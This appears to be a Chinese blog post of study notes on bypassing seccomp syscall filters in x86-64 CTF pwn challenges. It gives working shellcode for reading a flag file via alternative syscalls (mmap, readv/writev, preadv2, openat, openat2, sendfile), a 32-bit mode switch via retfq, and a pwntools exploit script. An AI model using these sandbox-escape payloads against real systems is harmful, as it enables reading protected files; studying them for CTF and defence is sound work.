---
title: seccomp学习 (2)
date: 2023-10-31 09:59:09
categories:
- 学习笔记
- seccomp 系列
---

在本文中，我们来讨论一下近年来针对seccomp的绕过姿势。本文仅讨论x86-64平台。（来货了来货了）

# 0x01. execve

这个是最为简单的一类题型，不能直接获得shell，但是可以通过open、read、write三个系统调用将flag文件首先保存到内存之中再输出到控制台。

下面的代码是在内存中不存在"./flag"字符串的情况下绕过execve的orw shellcode：

函数原型：
```c
    long sys_open(const char __user *filename, int flags, umode_t mode);
    long sys_read(unsigned int fd, char __user *buf, size_t count);
    long sys_write(unsigned int fd, const char __user *buf, size_t count);
```
这里对于`read`和`write`函数的参数都不需要解释，对于`open`函数，`flags`参数表示以何种方式打开文件，0为只读，当`open`没有创建文件时，`mode`参数会被忽略，不过最好还是也传入0。

示例：

```masm
    mov rax, 0x67616c662f2e
    push rax
    mov rdi, rsp
    xor edx, edx
    xor esi, esi
    push SYS_open
    pop rax
    syscall
    
    push 3
    pop rdi
    push 0xFF   /* read size */
    pop rdx
    mov rsi, rsp
    push SYS_read
    pop rax
    syscall
    
    push 1
    pop rdi
    push 0xFF   /* write size */
    pop rdx
    mov rsi, rsp
    push SYS_write
    pop rax
    syscall
```

# 0x02. execve + read

如果题目禁用了`read`系统调用，但没有禁用`open`，则可以通过`mmap`的系统调用将文件内容映射到内存中，再`write`。

需要注意的是，对于Linux系统调用，6个参数的传递寄存器分别为`rdi`、`rsi`、`rdx`、`r10`、`r8`、`r9`。与Glibc的传参有所不同。

函数原型：
```c
    long sys_mmap(unsigned long addr, unsigned long len,
			unsigned long prot, unsigned long flags,
			unsigned long fd, off_t pgoff);
```

```masm
    mov rax, 0x67616c662f2e
    push rax
    mov rdi, rsp
    xor edx, edx
    xor esi, esi
    push SYS_open
    pop rax
    syscall
    
    mov rdi, 0x10000
    mov rsi, 0x1000
    mov rdx, 7
    push 0x12
    pop r10
    push 0x3
    pop r8
    xor r9, r9
    push SYS_mmap
    pop rax
    syscall
    
    push 1
    pop rdi
    push 0xFF   /* write size */
    pop rdx
    mov rsi, 0x10000
    push SYS_write
    pop rax
    syscall
```

注意，内核的`mmap`函数的`flag`参数和glibc的不太一样，0x10表示映射文件`MAP_FILE`，0x2表示私有映射`MAP_PRIVATE`，0x20表示匿名映射`MAP_ANONYMOUS`。这里需要使用`MAP_FILE | MAP_PRIVATE`才能完成映射。

上述代码可以成功攻击下面的C代码：

```c
#include <sys/mman.h>
#include <stdio.h>
#include <sys/prctl.h>
#include <linux/seccomp.h>
#include <linux/filter.h>
#include <stdlib.h>
#include <unistd.h>
#include <linux/unistd.h>
#include <linux/audit.h>
#include <stddef.h>

int main(){
	char* space = mmap((void*)0x600000000000, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANON | MAP_SHARED, -1, 0);
	read(0, space, 0x1000);
	
	struct sock_filter filter[] = {
        BPF_STMT(BPF_LD | BPF_W | BPF_ABS, offsetof(struct seccomp_data, arch)),
        BPF_JUMP(BPF_JMP | BPF_JEQ, AUDIT_ARCH_X86_64, 0, 4),
        BPF_STMT(BPF_LD | BPF_W | BPF_ABS, offsetof(struct seccomp_data, nr)),
        BPF_JUMP(BPF_JMP | BPF_JEQ, 59, 2, 0),
        BPF_JUMP(BPF_JMP | BPF_JEQ, 0, 1, 0),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL)
    };
    struct sock_fprog prog = {
        .len = (unsigned short)(sizeof(filter) / sizeof(struct sock_filter)),
        .filter = filter,
    };
    prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0);
    prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &prog);
	
	((void(*)(void))space)();
}
```

# 0x03. execve + read + write

如果`read`和`write`都被禁用，我们又应该如何应对呢？不要急，这里给出最新版本Linux系统调用的64位系统调用号：[传送门](https://elixir.bootlin.com/linux/latest/source/arch/x86/entry/syscalls/syscall_64.tbl)

通过`pwn constgrep -c amd64 -m ^SYS`命令可以查看pwntools预先定义的所有32位与64位的系统调用号符号，这些符号可以用于pwntools脚本的汇编语言字符串中。

我们可以发现，系统调用表中还有`pread`、`pwrite`等似乎也可以进行读写的函数。下面就来详细分析一下这些系统调用：

## A. sys_pread64 (nr=17)

```c
    ssize_t pread(int fd, void* buf, size_t count, loff_t pos);
```

该函数与`read`函数类似，但参数有4个，第4个为开始读的偏移位置，且使用`sys_pread64`函数读取完成后，文件指针不会改变。

## B. sys_pwrite64 (nr=18, 不可用)

```c
    ssize_t pwrite(int fd, void* buf, size_t count, loff_t pos);
```

`sys_write64`与`sys_read64`类似，函数写操作完成后，文件指针不会改变。但是对于写操作而言，标准输出不是普通的文件描述符，可以看做一个字符设备，指定`pos`时写操作会失败。已经经过试验测试得出，`sys_write64`不能将内存中的内容输出到控制台中。

## C. sys_readv (nr=19)

```c
    ssize_t readv(int fd, const struct iovec *iov, int iovcnt);
```

`readv`函数实现了分散输入的功能，即将可以将一个文件描述符的内容写到多个内存缓冲区中。注意这里的“写入到多个内存缓冲区”指的是依次写入，第1个缓冲区写满之后才会接着文件后面的内容继续写第2个缓冲区。

```c
    struct iovec{
        void __user* iov_base;
        __kernel_size_t iov_len;
    }
```

这里的`vec`参数应该是`struct iovec`结构体的数组，而第三个参数`vlen`为数组的长度。`iovec`结构体中，`iov_base`为一个内存地址，`iov_len`为内存的长度。因此如果需要使用这个系统调用，需要首先构造`iovec`结构体实例。在pwn题中，我们只需要构造一个结构体实例即可。

## D. sys_writev (nr=20)

```c
    ssize_t writev(int fd, const struct iovec *iov, int iovcnt);
```

`writev`函数实现了集中输出的功能，即将`iovec`结构体数组中的缓冲区内容集中输出到一个文件描述符中。

下面为使用`readv`函数和`writev`函数的示例：

```masm
    mov rax, 0x67616c662f2e
    push rax
    mov rdi, rsp
    xor edx, edx
    xor esi, esi
    push SYS_open
    pop rax
    syscall
    
    push 3
    pop rdi
    push 0x1    /* iov size */
    pop rdx
    push 0x100
    lea rbx, [rsp-8]
    push rbx
    mov rsi, rsp
    push SYS_readv
    pop rax
    syscall
    
    push 1
    pop rdi
    push 0x1    /* iov size */
    pop rdx
    push 0x100
    lea rbx, [rsp+8]
    push rbx
    mov rsi, rsp
    push SYS_writev
    pop rax
    syscall
```

## E. sys_preadv (nr=295)

```c
    ssize_t preadv(int fd, const struct iovec *iov, int iovcnt,
                       off_t offset);
```

这个函数同时具有`pread`函数和`readv`函数的性质，使用`iovec*`结构体可完成分散输入，同时可设置偏移量且读取后不修改文件指针。其中`pos_l`指的是读取偏移的低32位，`pos_h`为高32位。

## F. sys_pwritev (nr=296, 不可用)

```c
    ssize_t pwritev(int fd, const struct iovec *iov, int iovcnt,
                       off_t offset);
```

这个函数同时具有`pwrite`函数和`writev`函数的性质，这也意味着其无法向标准输出写入内容。

## G. sys_preadv2 (nr=327)

```c
   ssize_t preadv2(int fd, const struct iovec *iov, int iovcnt,
                   off_t offset, int flags);
```

这个函数在参数上与`preadv`的区别是多了一个`flags`。这个`flags`的标志位主要针对一些效率、同步方面，直接填0即可。

## H. sys_pwritev2 (nr=328, 不可用)

```c
   ssize_t pwritev2(int fd, const struct iovec *iov, int iovcnt,
                   off_t offset, int flags);
```

对于上述系统调用，可以参考[资料](https://www.man7.org/linux/man-pages/man2/preadv2.2.html)进行学习。

# 0x04. execve + open

上述所有读写的系统调用都需要使用文件描述符，但如果禁用了`open`系统调用，又应该如何获取文件描述符呢？好在，还有其他的系统调用能够获取文件描述符。

## A. openat (nr=257)

```
    ssize_t openat(int dfd, const char* filename, int flags, umode_t mode);
```

参考[资料](https://blog.csdn.net/m0_38090681/article/details/103056884)，函数的第一个参数`dfd`指的是当`path`为相对路径时，该路径在文件系统中的开始地址（即打开目录获取的文件描述符），但可以指定其为`AT_FDCWD`(-100)，指定路径为当前路径。另外3个参数与`open`参数相同。`openat`的返回值与`open`相同，都是当前正未使用的最小的文件描述符值。

示例代码：
```masm
    mov rax, 0x67616c662f2e
    push rax
    xor rdi, rdi
    sub rdi, 100
    mov rsi, rsp
    xor edx, edx
    xor r10, r10
    push SYS_openat
    pop rax
    syscall
    
    mov rdi, 3
    push 0x100
    lea rbx, [rsp-8]
    push rbx
    mov rsi, rsp
    mov rdx, 1
    xor r10, r10
    xor r8, r8
    push SYS_preadv2
    pop rax
    syscall
    
    push 1
    pop rdi
    push 0x1
    pop rdx
    push 0x100
    lea rbx, [rsp+8]
    push rbx
    mov rsi, rsp
    push SYS_writev
    pop rax
    syscall
```

## B. openat2 (nr=437)

```c
    ssize_t openat2(int dfd, const char* filename, struct open_how* how, size_t usize);
```


这个函数封装了三个参数到结构体`how`中：

```c
struct open_how {
	__u64 flags;
	__u64 mode;
	__u64 resolve;
};
```

`dfd`与另外3个参数的使用方式与`openat`相同，`resolve`指解析路径名所有组件的方式，普通的打开文件操作填0即可。参数`size`必须为结构体`open_how`的大小，也就是`0x18`。

实例代码：

```c
    mov rax, 0x67616c662f2e
    push rax
    xor rdi, rdi
    sub rdi, 100
    mov rsi, rsp
    push 0
    push 0
    push 0
    mov rdx, rsp
    mov r10, 0x18
    push SYS_openat2
    pop rax
    syscall
```

# 0x05. execve + open + openat + openat2

如果题目禁用了x64的所有3个打开文件的系统调用，此时还有一种情况使得我们可以成功打开文件并获取文件描述符：当seccomp没有禁用x64的fstat系统调用时，可以通过将程序暂时转换为32位模式再通过`open`系统调用打开文件，因为32位的`open`系统调用与64位的不同，32位`open`的系统调用号为5，对应x64的系统调用表中为`fstat`系统调用。

`retfq`指令，在x86-64中可用于将程序从64位长模式转换为32位模式，在转换时需要注意修改栈地址为32位地址，并向栈中保存一些特定值，在64位系统中，`cs`寄存器的值为0x23时表示当前程序处于32位状态，值为0x33时表示当前程序处于64位状态。在执行`retfq`指令之前，我们就应该修改`rsp`，并将0x23和要执行的32位指令地址push进栈。在执行`retfq`后，程序将自动转到32位环境中工作。在32位代码执行结束后，如果需要返回到64位状态，可通过`jmp 0x33:xxxxx ; ret`的指令返回到64位代码。

注意：如果在执行`retfq`时`rsp`高位的任何值都会被直接舍弃，只取低32位作为新的栈地址，而这个地址通常是不能预先获取的，因此`retfq`前重新赋值`rsp`很有必要。

示例：

```python
from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'

shellcode_64_1 = '''
    mov rdi, 0x10000
    mov rsi, 0x1000
    mov rdx, 7
    mov r10, 0x21
    mov r8, 0xFFFFFFFF
    xor r9, r9
    push SYS_mmap
    pop rax
    syscall
    
    cld
    mov rcx, 0x200
    mov rdi, 0x10000
    mov rsi, 0x600000000100
    rep movsb
    
    mov rsp, 0x10800
    push 0x23
    push 0x10000
    pop rax
    push rax
    retfq
'''

shellcode_32 = '''
	mov eax, 0x6761
	push eax
	mov eax, 0x6c662f2e
	push eax
	mov ebx, esp
	xor ecx, ecx
	xor edx, edx
	mov eax, 5
	int 0x80
	jmp 0x33:0x10100
	ret
'''

shellcode_64_2 = '''
    mov rdi, 3
    push 0x100
    lea rbx, [rsp-8]
    push rbx
    mov rsi, rsp
    mov rdx, 1
    xor r10, r10
    xor r8, r8
    push SYS_preadv2
    pop rax
    syscall
    
    push 1
    pop rdi
    push 0x1
    pop rdx
    push 0x100
    lea rbx, [rsp+8]
    push rbx
    mov rsi, rsp
    push SYS_writev
    pop rax
    syscall
'''

io = process('./test')
payload = asm(shellcode_64_1).ljust(0x100, b'\0')
payload += asm(shellcode_32, arch='i386', bits=32)
payload = payload.ljust(0x200, b'\0')
payload += asm(shellcode_64_2)
io.send(payload)
io.interactive()
```

需要注意的是32位的系统调用使用的是`int 0x80`指令触发，且传参使用的寄存器也有所不同（`rbx`、`rcx`、`rdx`、`rsi`、`rdi`）。既然转到32位可以绕过基于系统调用号的检查，那么自然而然地，我们也可以进行扩展，如果禁用了64位的所有`read`与`write`，或许也可以通过使用32位的`read`和`write`相关系统调用完成读写操作。这一部分就交给读者自行探索。

# 0x06. 其他

如果题目禁用了所有与`read`和`write`相关，也就是上面提到的与读写相关的所有系统调用，我们又应该如何应对呢？实际上seccomp的绕过姿势有很多，这里介绍一下sendfile，至于其他的技巧将在下一篇文章中介绍。

## A. sendfile (nr=40)

这是一个很好用的系统调用，它允许将文件数据从一个文件描述符直接发送到另一个文件描述符，而且不需要经过缓冲区拷贝，被称为“零拷贝技术”，这一技术也被应用于`mmap`等系统调用中。可以说这个系统调用用起来比`read`+`write`还要简单。

```c
    ssize_t sendfile(int out_fd, int in_fd, off_t* offset, size_t count);
```

示例：

```masm
    mov rdi, 1
    mov rsi, 3
    push 0
    mov rdx, rsp
    mov r10, 0x100
    push SYS_sendfile
    pop rax
    syscall
```